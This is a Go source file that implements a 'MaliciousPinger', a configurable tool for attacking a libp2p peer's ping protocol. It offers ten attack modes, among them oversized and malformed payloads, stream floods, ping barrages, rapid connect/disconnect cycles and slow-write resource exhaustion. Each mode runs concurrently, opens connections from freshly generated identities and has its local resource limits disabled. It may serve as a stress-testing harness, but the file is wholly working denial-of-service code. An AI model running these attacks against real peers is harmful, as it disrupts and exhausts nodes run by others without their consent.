package resources

import (
	"context"
	"fmt"
	"log"
	"math/rand"
	"sync"
	"time"

	"github.com/libp2p/go-libp2p"
	"github.com/libp2p/go-libp2p/core/crypto"
	"github.com/libp2p/go-libp2p/core/host"
	"github.com/libp2p/go-libp2p/core/network"
	"github.com/libp2p/go-libp2p/core/peer"
	"github.com/multiformats/go-multiaddr"
)

const (
	pingProtocol = "/ipfs/ping/1.0.0"
)

type PingAttackType int

const (
	RandomPayload PingAttackType = iota
	OversizedPayload
	EmptyPayload
	MultipleStreams
	IncompleteWrite
	PingBarrage       // New: sends many pings in rapid succession
	MalformedPayload  // New: sends structurally invalid data
	ConnectDisconnect // New: rapidly connects and disconnects
	VariablePayload   // New: sends payloads of varying sizes
	SlowWrite         // New: writes data very slowly to exhaust stream handlers
)

type MaliciousPinger struct {
	ctx         context.Context
	targetInfo  *peer.AddrInfo
	running     bool
	stopCh      chan struct{}
	attackType  PingAttackType
	concurrency int
	minInterval time.Duration
	maxInterval time.Duration
}

func NewMaliciousPinger(ctx context.Context, targetMultiaddr string) (*MaliciousPinger, error) {
	targetAddr, err := multiaddr.NewMultiaddr(targetMultiaddr)
	if err != nil {
		return nil, fmt.Errorf("invalid target multiaddr: %w", err)
	}

	addrInfo, err := peer.AddrInfoFromP2pAddr(targetAddr)
	if err != nil {
		return nil, fmt.Errorf("failed to extract peer info from multiaddr: %w", err)
	}

	return &MaliciousPinger{
		ctx:        ctx,
		targetInfo: addrInfo,
		stopCh:     make(chan struct{}),
		attackType: RandomPayload,
	}, nil
}

func (mp *MaliciousPinger) Start(attackType PingAttackType, concurrency int, minInterval, maxInterval time.Duration) {
	if mp.running {
		log.Println("Malicious ping is already running")
		return
	}

	mp.running = true
	mp.attackType = attackType
	mp.concurrency = concurrency
	mp.minInterval = minInterval
	mp.maxInterval = maxInterval

	go mp.run()
}

func (mp *MaliciousPinger) Stop() {
	if !mp.running {
		return
	}
	mp.running = false
	mp.stopCh <- struct{}{}
}

func (mp *MaliciousPinger) IsRunning() bool {
	return mp.running
}

func (mp *MaliciousPinger) run() {
	var wg sync.WaitGroup
	ticker := time.NewTicker(mp.minInterval)
	defer ticker.Stop()

	log.Printf("Starting malicious ping attack against %s with attack type %d", mp.targetInfo.ID, mp.attackType)

	for mp.running {
		select {
		case <-mp.ctx.Done():
			mp.running = false
			return
		case <-mp.stopCh:
			return
		case <-ticker.C:
			for i := 0; i < mp.concurrency; i++ {
				wg.Add(1)
				go func() {
					defer wg.Done()
					if err := mp.executeAttack(); err != nil {
						log.Printf("Error in ping attack: %v", err)
					}
				}()
			}

			if mp.maxInterval > mp.minInterval {
				nextInterval := mp.minInterval + time.Duration(rand.Int63n(int64(mp.maxInterval-mp.minInterval)))
				ticker.Reset(nextInterval)
			}
		}
	}

	wg.Wait()
	log.Println("Malicious ping attack stopped")
}

func (mp *MaliciousPinger) executeAttack() error {
	priv, _, err := crypto.GenerateKeyPair(crypto.Ed25519, -1)
	if err != nil {
		return fmt.Errorf("failed to generate key pair: %v", err)
	}

	h, err := libp2p.New(
		libp2p.Identity(priv),
		libp2p.ListenAddrStrings("/ip4/0.0.0.0/tcp/0"),
		libp2p.ResourceManager(&network.NullResourceManager{}),
	)
	if err != nil {
		return fmt.Errorf("failed to create host: %v", err)
	}
	defer h.Close()

	if err := h.Connect(mp.ctx, *mp.targetInfo); err != nil {
		return fmt.Errorf("failed to connect to target: %v", err)
	}

	log.Printf("Connected to target %s for ping attack", mp.targetInfo.ID)

	switch mp.attackType {
	case RandomPayload:
		return mp.sendRandomPingPayload(h)
	case OversizedPayload:
		return mp.sendOversizedPingPayload(h)
	case EmptyPayload:
		return mp.sendEmptyPingPayload(h)
	case MultipleStreams:
		return mp.openMultiplePingStreams(h)
	case IncompleteWrite:
		return mp.sendIncompletePingPayload(h)
	case PingBarrage:
		return mp.sendPingBarrage(h)
	case MalformedPayload:
		return mp.sendMalformedPayload(h)
	case ConnectDisconnect:
		return mp.performConnectDisconnect(h)
	case VariablePayload:
		return mp.sendVariablePayload(h)
	case SlowWrite:
		return mp.performSlowWrite(h)
	default:
		return mp.sendRandomPingPayload(h)
	}
}

func (mp *MaliciousPinger) sendRandomPingPayload(h host.Host) error {
	stream, err := h.NewStream(mp.ctx, mp.targetInfo.ID, pingProtocol)
	if err != nil {
		return fmt.Errorf("failed to open ping stream: %v", err)
	}
	defer stream.Close()

	payloadSize := rand.Intn(1024) + 1
	payload := make([]byte, payloadSize)
	rand.Read(payload)

	log.Printf("Sending random ping payload, size: %d bytes", payloadSize)
	_, err = stream.Write(payload)
	if err != nil {
		return fmt.Errorf("failed to write random ping payload: %v", err)
	}

	readCtx, cancel := context.WithTimeout(mp.ctx, 500*time.Millisecond)
	defer cancel()

	respBuf := make([]byte, 1024)
	stream.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
	n, err := stream.Read(respBuf)
	if err != nil {
		log.Printf("No response or error from ping: %v", err)
	} else {
		log.Printf("Received ping response, size: %d bytes", n)
	}

	select {
	case <-readCtx.Done():
	default:
	}

	return nil
}

func (mp *MaliciousPinger) sendOversizedPingPayload(h host.Host) error {
	stream, err := h.NewStream(mp.ctx, mp.targetInfo.ID, pingProtocol)
	if err != nil {
		return fmt.Errorf("failed to open ping stream: %v", err)
	}
	defer stream.Close()

	payloadSize := 5 * 1024 * 1024
	payload := make([]byte, payloadSize)
	rand.Read(payload)

	log.Printf("Sending oversized ping payload, size: %d bytes", payloadSize)
	_, err = stream.Write(payload)
	if err != nil {
		return fmt.Errorf("failed to write oversized ping payload: %v", err)
	}

	return nil
}

func (mp *MaliciousPinger) sendEmptyPingPayload(h host.Host) error {
	stream, err := h.NewStream(mp.ctx, mp.targetInfo.ID, pingProtocol)
	if err != nil {
		return fmt.Errorf("failed to open ping stream: %v", err)
	}
	defer stream.Close()

	log.Printf("Sending empty ping payload")
	_, err = stream.Write([]byte{})
	if err != nil {
		return fmt.Errorf("failed to write empty ping payload: %v", err)
	}

	return nil
}

func (mp *MaliciousPinger) openMultiplePingStreams(h host.Host) error {
	numStreams := 20 + rand.Intn(20)
	log.Printf("Opening %d ping streams simultaneously", numStreams)

	streams := make([]network.Stream, 0, numStreams)
	for i := 0; i < numStreams; i++ {
		stream, err := h.NewStream(mp.ctx, mp.targetInfo.ID, pingProtocol)
		if err != nil {
			log.Printf("Failed to open ping stream %d: %v", i, err)
			continue
		}
		streams = append(streams, stream)
	}

	time.Sleep(2 * time.Second)

	for i, stream := range streams {
		if err := stream.Close(); err != nil {
			log.Printf("Error closing stream %d: %v", i, err)
		}
	}

	return nil
}

func (mp *MaliciousPinger) sendIncompletePingPayload(h host.Host) error {
	stream, err := h.NewStream(mp.ctx, mp.targetInfo.ID, pingProtocol)
	if err != nil {
		return fmt.Errorf("failed to open ping stream: %v", err)
	}
	defer stream.Close()

	payloadSize := 1024
	payload := make([]byte, payloadSize)
	rand.Read(payload)

	halfSize := payloadSize / 2
	log.Printf("Writing incomplete ping payload (first %d of %d bytes)", halfSize, payloadSize)
	_, err = stream.Write(payload[:halfSize])
	if err != nil {
		return fmt.Errorf("failed to write first half of ping payload: %v", err)
	}

	time.Sleep(1 * time.Second)

	return nil
}

func (mp *MaliciousPinger) sendPingBarrage(h host.Host) error {
	barrageCount := 10 + rand.Intn(40)
	log.Printf("Sending ping barrage with %d consecutive pings", barrageCount)

	var wg sync.WaitGroup
	errChan := make(chan error, barrageCount)

	for i := 0; i < barrageCount; i++ {
		wg.Add(1)
		go func(index int) {
			defer wg.Done()
			stream, err := h.NewStream(mp.ctx, mp.targetInfo.ID, pingProtocol)
			if err != nil {
				errChan <- fmt.Errorf("failed to open ping stream %d: %v", index, err)
				return
			}
			defer stream.Close()

			payloadSize := rand.Intn(4096) + 1
			payload := make([]byte, payloadSize)
			rand.Read(payload)

			_, err = stream.Write(payload)
			if err != nil {
				errChan <- fmt.Errorf("failed to write ping barrage payload %d: %v", index, err)
			}
		}(i)

		time.Sleep(time.Millisecond * 5)
	}

	wg.Wait()
	close(errChan)

	var errorCount int
	for err := range errChan {
		errorCount++
		log.Printf("Barrage error: %v", err)
	}

	log.Printf("Ping barrage completed with %d/%d errors", errorCount, barrageCount)
	return nil
}

func (mp *MaliciousPinger) sendMalformedPayload(h host.Host) error {
	stream, err := h.NewStream(mp.ctx, mp.targetInfo.ID, pingProtocol)
	if err != nil {
		return fmt.Errorf("failed to open ping stream: %v", err)
	}
	defer stream.Close()

	malformType := rand.Intn(4)
	var payload []byte

	switch malformType {
	case 0:
		payload = []byte{0xff, 0xff, 0xff, 0xff}
		log.Printf("Sending malformed payload: truncated length prefix")
	case 1:
		payload = []byte{0xC0, 0xAF, 0xE0, 0x80, 0xBF, 0xF0, 0x28, 0x8C, 0x28}
		log.Printf("Sending malformed payload: invalid UTF-8 sequences")
	case 2:
		size := 100 + rand.Intn(1000)
		payload = make([]byte, size)
		rand.Read(payload)
		// Ensure some bytes are control characters
		for i := 0; i < size/10; i++ {
			randIndex := rand.Intn(size)
			payload[randIndex] = byte(rand.Intn(32))
		}
		log.Printf("Sending malformed payload: random binary garbage (%d bytes)", size)
	case 3:
		payload = []byte("{\"invalid\": \"json format for ping protocol\"}")
		log.Printf("Sending malformed payload: invalid protocol format")
	}

	_, err = stream.Write(payload)
	if err != nil {
		return fmt.Errorf("failed to write malformed payload: %v", err)
	}

	stream.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
	respBuf := make([]byte, 1024)
	_, err = stream.Read(respBuf)
	if err != nil {
		log.Printf("No response to malformed payload, as expected: %v", err)
	} else {
		log.Printf("Unexpectedly received response to malformed payload")
	}

	return nil
}

func (mp *MaliciousPinger) performConnectDisconnect(h host.Host) error {
	log.Printf("Performing rapid connect/disconnect cycle")

	// We already have one connection from the function entry
	// Close and reconnect rapidly several times
	cycleCount := 5 + rand.Intn(10) // 5-15 cycles

	for i := 0; i < cycleCount; i++ {
		// Disconnect
		if err := h.Network().ClosePeer(mp.targetInfo.ID); err != nil {
			log.Printf("Error closing connection to peer: %v", err)
		}

		// Brief pause
		time.Sleep(time.Millisecond * time.Duration(10+rand.Intn(30)))

		// Reconnect
		if err := h.Connect(mp.ctx, *mp.targetInfo); err != nil {
			log.Printf("Failed to reconnect to target in cycle %d: %v", i, err)
			continue
		}

		// Send a tiny ping immediately after connecting
		if stream, err := h.NewStream(mp.ctx, mp.targetInfo.ID, pingProtocol); err == nil {
			_, _ = stream.Write([]byte{0x01})
			stream.Close()
		}
	}

	log.Printf("Connect/disconnect cycles completed: %d", cycleCount)
	return nil
}

func (mp *MaliciousPinger) sendVariablePayload(h host.Host) error {
	log.Printf("Sending variable-sized payloads")

	// Open a single stream for multiple writes
	stream, err := h.NewStream(mp.ctx, mp.targetInfo.ID, pingProtocol)
	if err != nil {
		return fmt.Errorf("failed to open ping stream: %v", err)
	}
	defer stream.Close()

	sizes := []int{
		0,           // Empty
		1,           // Single byte
		16,          // Small
		128,         // Medium
		4096,        // Large
		64 * 1024,   // Very large
		1024 * 1024, // 1MB
	}

	// Randomly select up to 10 sizes and send them in sequence
	numSequences := 5 + rand.Intn(5) // 5-10 sequences
	for i := 0; i < numSequences; i++ {
		size := sizes[rand.Intn(len(sizes))]
		payload := make([]byte, size)
		rand.Read(payload)

		log.Printf("Writing variable payload %d/%d: %d bytes", i+1, numSequences, size)
		_, err := stream.Write(payload)
		if err != nil {
			log.Printf("Error writing variable payload: %v", err)
			break
		}

		// Very brief pause between writes
		time.Sleep(time.Millisecond * 10)
	}

	return nil
}

func (mp *MaliciousPinger) performSlowWrite(h host.Host) error {
	stream, err := h.NewStream(mp.ctx, mp.targetInfo.ID, pingProtocol)
	if err != nil {
		return fmt.Errorf("failed to open ping stream: %v", err)
	}
	defer stream.Close()

	totalSize := 8 * 1024 // 8KB total
	chunkSize := 1        // 1 byte at a time

	log.Printf("Starting slow write attack: %d bytes total, %d bytes per chunk", totalSize, chunkSize)

	payload := make([]byte, totalSize)
	rand.Read(payload)

	for i := 0; i < totalSize; i += chunkSize {
		end := i + chunkSize
		if end > totalSize {
			end = totalSize
		}

		chunk := payload[i:end]
		_, err := stream.Write(chunk)
		if err != nil {
			return fmt.Errorf("failed during slow write at position %d: %v", i, err)
		}

		// Sleep between writes to make it painfully slow
		delay := time.Duration(50+rand.Intn(100)) * time.Millisecond
		time.Sleep(delay)

		// Periodically log progress
		if i%1024 == 0 || i+chunkSize >= totalSize {
			log.Printf("Slow write progress: %d/%d bytes (%.1f%%)", i+chunkSize, totalSize, float64(i+chunkSize)/float64(totalSize)*100)
		}
	}

	log.Printf("Slow write completed")
	return nil
}

func AttackTypeFromString(attackType string) PingAttackType {
	switch attackType {
	case "random":
		return RandomPayload
	case "oversized":
		return OversizedPayload
	case "empty":
		return EmptyPayload
	case "multiple":
		return MultipleStreams
	case "incomplete":
		return IncompleteWrite
	case "barrage":
		return PingBarrage
	case "malformed":
		return MalformedPayload
	case "connectdisconnect":
		return ConnectDisconnect
	case "variable":
		return VariablePayload
	case "slow":
		return SlowWrite
	default:
		return RandomPayload
	}
}

func GetAttackTypes() []string {
	return []string{
		"random",
		"oversized",
		"empty",
		"multiple",
		"incomplete",
		"barrage",
		"malformed",
		"connectdisconnect",
		"variable",
		"slow",
	}
}
